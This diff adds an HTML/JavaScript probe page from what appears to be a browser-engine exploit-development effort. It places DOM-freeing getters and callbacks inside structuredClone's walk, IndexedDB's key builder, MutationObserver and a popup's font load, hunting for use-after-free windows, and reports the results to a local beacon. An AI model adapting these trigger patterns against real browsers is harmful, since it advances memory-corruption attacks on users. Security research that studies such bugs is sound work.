@@ -1,0 +1,168 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>caps5 — the four surfaces GOAL.md item 1 names: structuredClone, IndexedDB's key builder, MutationObserver, window.open</title>
+<body>
+<div id="host"><p id="p0">delta</p></div>
+<script>
+// docs/87 probe, before any op is written.  Four questions, one beacon line each:
+//   (a) structuredClone: does a getter run *inside* the serializer's walk (past the 32-entry inline
+//       Vector, so the walk is in its heap buffer), and can that getter free DOM objects?
+//   (b) IndexedDB's key builder: is IDBKeyRange.only reachable, and does an array HOLE fall through
+//       to a page getter inside createIDBKeyFromValue (docs/78 read that path, no run drove it)?
+//   (c) MutationObserver: does a callback fire, and is it a script window that can remove nodes?
+//   (d) window.open: is a third Document class reachable from script, with its own FontFaceSet, and
+//       can it be closed from inside its own font window?
+function ev(m) { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)); }
+function T(x) { try { return typeof x; } catch (e) { return 'ERR:' + e.name; } }
+function tag(o) { try { return Object.prototype.toString.call(o).slice(8, -1); } catch (e) { return 'ERR'; } }
+var host = document.getElementById('host'), p0 = document.getElementById('p0');
+
+ev('caps5 js=1 structuredClone=' + T(window.structuredClone) + ' indexedDB=' + T(window.indexedDB) +
+   ' IDBKeyRange=' + T(window.IDBKeyRange) + ' MutationObserver=' + T(window.MutationObserver) +
+   ' open=' + T(window.open));
+
+// ---------------------------------------------------------------- (a) structuredClone
+(function () {
+  var gHit = 0, gErr = '', gKids = -1, gClone = 0;
+  var root = { v: 0 }, cur = root;
+  for (var i = 0; i < 40; i++) { var nx = { i: i }; cur.next = nx; cur = nx; }
+  // the getter sits at depth 40, i.e. when inputObjectStack is in its heap buffer (cap 32)
+  Object.defineProperty(cur, 'late', {
+    configurable: true,
+    get: function () {
+      gHit++;
+      try {
+        var sp = document.getElementById('sp5');
+        if (sp && sp.parentNode) sp.parentNode.removeChild(sp);
+        document.body.offsetHeight;             // layout inside the walk: can free engine objects
+        if (p0 && p0.parentNode) p0.parentNode.removeChild(p0);
+        document.body.offsetHeight;
+        gKids = host.childNodes.length;
+      } catch (e) { gErr = e.name; }
+      return 'L';
+    }
+  });
+  var sp = document.createElement('span'); sp.id = 'sp5'; sp.textContent = 'y'; host.appendChild(sp);
+  var out = null;
+  try { out = structuredClone(root); } catch (e) { ev('clone err=' + e.name); }
+  var depth = 0, c = out;
+  while (c && c.next) { depth++; c = c.next; }
+  if (out && c) gClone = (c.late === 'L') ? 1 : 0;
+  ev('clone get=' + gHit + ' err=' + (gErr || '-') + ' depth=' + depth + ' late=' + gClone + ' kids=' + gKids);
+  // control: no getter -> the same shape clones with get=0 in a fresh read
+  var plain = { a: 1 }; plain.next = { b: 2 };
+  var o2 = null; try { o2 = structuredClone(plain); } catch (e) {}
+  ev('clone plain=' + (o2 && o2.next && o2.next.b === 2 ? 1 : 0));
+})();
+
+// ---------------------------------------------------------------- (b) IndexedDB key builder
+(function () {
+  var ih = 0, ierr = '', ilen = -1, inested = 0;
+  Object.defineProperty(Array.prototype, '1', {
+    configurable: true,
+    get: function () {
+      ih++;
+      // a hole that yields an object makes createIDBKeyFromValue recurse: also a script value
+      if (ih === 2) { inested = 1; return [4, 5]; }
+      return 7;
+    }
+  });
+  var r = null;
+  try { r = IDBKeyRange.only([1, , 3]); } catch (e) { ierr = e.name; }
+  try { if (r && r.lower) ilen = String(r.lower).length; } catch (e) {}
+  ev('idb only=' + (r ? 1 : 0) + ' hits=' + ih + ' nested=' + inested + ' err=' + (ierr || '-') +
+     ' lower=' + (r && r.lower ? tag(r.lower) : '-'));
+  // second shape: the same hole through a nested array (the Vector<JSArray*> push then getIndex)
+  var r2 = null, ih2 = ih;
+  try { r2 = IDBKeyRange.only([[1, , 3]]); } catch (e) { ierr = e.name; }
+  ev('idb nested=' + (r2 ? 1 : 0) + ' hits=' + (ih - ih2) + ' err=' + (ierr || '-'));
+  try { delete Array.prototype[1]; } catch (e) {}
+  // does a real database exist (docs/78 measured typeof object; this measures open())
+  var op = null, oerr = '';
+  try { op = indexedDB.open('zz5', 1); } catch (e) { oerr = e.name; }
+  if (op) {
+    op.onupgradeneeded = function (e) {
+      try {
+        var db = e.target.result;
+        var st = db.createObjectStore('s');
+        st.put({ a: 1 }, 'k');
+      } catch (x) { ev('idb up err=' + x.name); }
+    };
+    op.onsuccess = function () { ev('idb db=1'); };
+    op.onerror = function (e) { ev('idb db=0 err=' + (e.target && e.target.error && e.target.error.name)); };
+  } else { ev('idb db=0 err=' + (oerr || '-')); }
+})();
+
+// ---------------------------------------------------------------- (c) MutationObserver
+(function () {
+  var hits = 0, kids = -1, recs = -1, err = '';
+  var mo = new MutationObserver(function (r, obs) {
+    hits++; recs = r.length;
+    try {
+      // the callback is a script window: remove the node it is reporting on, force layout
+      if (p0 && p0.parentNode) p0.parentNode.removeChild(p0);
+      document.body.offsetHeight;
+      kids = host.childNodes.length;
+      obs.takeRecords();
+    } catch (e) { err = e.name; }
+  });
+  try { mo.observe(host, { childList: true, subtree: true, attributes: true }); } catch (e) { err = 'obs:' + e.name; }
+  host.appendChild(document.createElement('b'));
+  host.setAttribute('a', '1');
+  setTimeout(function () { ev('mo hits=' + hits + ' recs=' + recs + ' kids=' + kids + ' err=' + (err || '-')); }, 40);
+})();
+
+// ---------------------------------------------------------------- (d) window.open
+(function () {
+  var w = null, oerr = '';
+  try { w = window.open('', 'zzpop5'); } catch (e) { oerr = e.name; }
+  ev('open got=' + (w ? 1 : 0) + ' err=' + (oerr || '-') + ' closed=' + (w ? (w.closed ? 1 : 0) : '-'));
+  if (!w) return;
+  var doc = null;
+  try { doc = w.document; } catch (e) { ev('open docerr=' + e.name); }
+  if (doc) {
+    try {
+      doc.open(); doc.write('<!doctype html><meta charset="utf-8"><style id="pv">x{}</style><body><p>pop</p></body>'); doc.close();
+    } catch (e) { ev('open writeerr=' + e.name); }
+  }
+  setTimeout(function () {
+    var d = null;
+    try { d = w.document; } catch (e) { ev('open doc2err=' + e.name); }
+    ev('open doc=' + (d ? 1 : 0) + ' fonts=' + (d && d.fonts ? d.fonts.size : 'n/a') + ' closed=' + (w.closed ? 1 : 0));
+    if (!d || !d.fonts) return;
+    var hits = 0, st = '';
+    try {
+      // install the popup's own-realm accessor and drive a font load from the PARENT
+      Object.defineProperty(w.FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+          hits++;
+          ev('open then hit=' + hits + ' on=' + tag(this));
+          try { (new Image()).src = '/ev?m=popthen&h=' + hits; } catch (e) {}
+          if (hits === 1) {
+            try { if (d.getElementById('pv') && d.getElementById('pv').parentNode) d.getElementById('pv').parentNode.removeChild(d.getElementById('pv')); } catch (e) {}
+            try { d.body.offsetHeight; } catch (e) {}
+            if (hits >= 1) { try { w.close(); ev('open close called=' + hits); } catch (e) {} }
+          }
+          return undefined;
+        },
+        set: function (v) {}
+      });
+      var s = d.createElement('style');
+      s.textContent = '@font-face{font-family:zpop;src:local("DejaVu Sans")}';
+      d.head.appendChild(s);
+      var f = null;
+      d.fonts.forEach(function (x) { if (String(x.family).indexOf('zpop') >= 0) f = x; });
+      ev('open found=' + (f ? 1 : 0) + ' fc=' + d.fonts.size);
+      if (f) {
+        try { f.loaded; } catch (e) {}
+        try { f.load(); } catch (e) { ev('open loaderr=' + e.name); }
+        st = f.status;
+      }
+    } catch (e) { ev('open fp err=' + e.name); }
+    ev('open post st=' + st + ' hits=' + hits + ' closed=' + (w.closed ? 1 : 0));
+    if (!w.closed) { try { w.close(); } catch (e) {} }
+    ev('done caps5');
+  }, 500);
+})();
+</script>
